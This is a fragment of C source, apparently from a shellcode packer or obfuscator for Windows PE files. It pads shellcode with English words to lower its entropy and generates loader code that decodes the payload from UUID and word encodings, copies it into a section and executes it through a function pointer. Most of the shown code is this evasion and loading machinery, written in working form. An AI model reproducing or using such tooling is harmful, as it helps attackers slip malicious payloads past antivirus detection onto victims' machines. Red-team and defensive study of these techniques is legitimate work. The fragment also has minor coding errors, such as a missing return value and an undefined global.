        eklenecekbytesayisi += strlen(words[i]);
    }


    return eklenecekbytesayisi;
}

char* decreaseEntropy(unsigned char* shellcode, DWORD size, int* newshellcodesize, int rate) {
    char* theLastOfShellcode = shellcode + size;

    if (rate == NULL) {
        printf("\nHow frequently should you insert a pattern into the payload?\n");
        printf("rate:");
        scanf_s("%d", &rate);
    }

    int numberOfWord = (size % rate != 0) ? (size / rate + 1) : (size / rate);

    int eklenecekbytesayisi = eklenecekbytesayisinibul(&words, numberOfWord);

    *newshellcodesize = size + eklenecekbytesayisi;

    if (shellcode == NULL) return;

    unsigned char* newcentral = (unsigned char*)malloc(*newshellcodesize);
    memset(newcentral, 0, *newshellcodesize);
    unsigned char* tempnewcentral = newcentral;

    for (int i = 0; i < numberOfWord; i++) {
        if (theLastOfShellcode < (shellcode + rate)) rate = size - (numberOfWord - 1) * rate;
        memcpy(tempnewcentral, shellcode, rate);
        shellcode += rate;
        tempnewcentral += rate;

        memcpy(tempnewcentral, words[i], strlen(words[i]));
        tempnewcentral += strlen(words[i]);
    }

    return newcentral;
}

void print_decryption_mechanism(PSECTION section) {
    char lastVal[50];

    for (int i = section->numberOfencryptionMethods - 1; i > -1; i--) {
        char val[200], firstParam[50];
        DWORD secondParam, thirdParam;
        int encryption_method;

        switch (encryption_method = section->encryption_methods[i])
        {
        case 0: // UUID
            if (i == section->numberOfencryptionMethods - 1) {
                sprintf_s(firstParam, sizeof(firstParam), "(byte*)imageBase + RVA");
                secondParam = section->EncInfos[i]->afterSize;
                thirdParam = section->EncInfos[i]->beforeSize;
            }
            else {
                strcpy_s(firstParam, sizeof firstParam, section->EncInfos[i+1]->strVar);
                secondParam = section->EncInfos[i]->afterSize; // or encInfos[i]->afterSize is same.
                thirdParam = section->EncInfos[i]->beforeSize;
                sprintf_s(lastVal, sizeof lastVal, "shellcode_UUID_Deobfuscated");
            }

            memset(val, 0, sizeof val);
            sprintf_s(val, sizeof val, "char* shellcode_UUID_Deobfuscated = UUID_Deobfuscation(%s, 0x%x, 0x%x);", firstParam, secondParam, thirdParam);

            printf("%s\n", val);

            break;
        case 1: // English Words
            if (i == section->numberOfencryptionMethods - 1) {
                sprintf_s(firstParam, sizeof(firstParam), "(byte*)imageBase + RVA");
                secondParam = section->EncInfos[i]->afterSize;
                thirdParam = section->EncInfos[i]->beforeSize;
                sprintf_s(lastVal, sizeof lastVal, "shellcode_InsertEnglishWords_Deobfuscated");
            }
            else {
                strcpy_s(firstParam, sizeof firstParam, section->EncInfos[i+1]->strVar);
                thirdParam = section->EncInfos[i]->beforeSize;
                sprintf_s(lastVal, sizeof lastVal, "shellcode_InsertEnglishWords_Deobfuscated");
            }

            secondParam = section->EncInfos[i]->rate;

            memset(val, 0, sizeof val);
            sprintf_s(val, sizeof val, "char* shellcode_InsertEnglishWords_Deobfuscated = decreaseEntropyDecoder(%s, %d, 0x%x);", firstParam, secondParam, thirdParam);

            printf("%s\n", val);

            break;
        case 2: // Same bytes
            break;
        default:
            continue;
        }
    }

    printf(
        "memcpy((byte*)imageBase + RVA, %s, 0x%x);\n"
        "char* addr = (char*)find_signature((char*)imageBase + RVA, 0x%x, 0xABCDEFBA);\n"
        "void (*fun_ptr)() = addr;\n"
        "((void(*)())(*fun_ptr))();\n\n"
        "Add the parts of code above into main function for decryption",
        lastVal,
        section->SizeOfRawData,
        section->SizeOfRawData
    );

    rate = NULL;
}

char* basename(char* filename) {
    if (strchr(filename, '\\') == NULL) return filename;

    char* beg = strrchr(filename, '\\') + 1;
    char* last = &filename[strlen(filename)];

    char* name = (char*)malloc(last - beg + 1);
    memset(name, 0, last - beg + 1);
    memcpy(name, beg, last - beg + 1);

    return name;
}

int check_RVAs(pFile f1, pFile f2) {
    PSECTION section_1 = NULL, section_2 = NULL;

    for (int i = 0; i < f1->pe->numberOfSections; i++) {
        section_1 = f1->pe->sectionsList[i];
        
        for (int j = 0; j < f2->pe->numberOfSections; j++) {
            section_2 = f2->pe->sectionsList[j];

            if (strcmp(section_1->name, section_2->name) == 0) {
                if (section_1->RVA != section_2->RVA) {
                    printf("\nInfo:\n\t- RVA of %s sections is different from each other\n\t- Before RVA: 0x%x\n\t- The current RVA: 0x%x\n\n", section_1->name, section_1->RVA, section_2->RVA);
                    return i;
                }
                break;
            }
       }
    }

    return NULL;
}

void fill_section_by_same_bytes(char* sectionBeginAddress) {
    for (int i = 0; i < section->SizeOfRawData; i++) {
        *sectionBeginAddress++ = SAME_BYTE_VAL;
    }
}

char* base64_encode(const unsigned char* data, size_t input_length, DWORD* output_length) {

    *output_length = 4 * ((input_length + 2) / 3);

    char* encoded_data = malloc(*output_length + 1); // for null byte
    memset(encoded_data, 0, *output_length + 1);
    if (encoded_data == NULL) return NULL;

    for (int i = 0, j = 0; i < input_length;) {

        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < mod_table[input_length % 3]; i++)
        encoded_data[*output_length - 1 - i] = '=';
    encoded_data[*output_length] = '\0';
    return encoded_data;
}

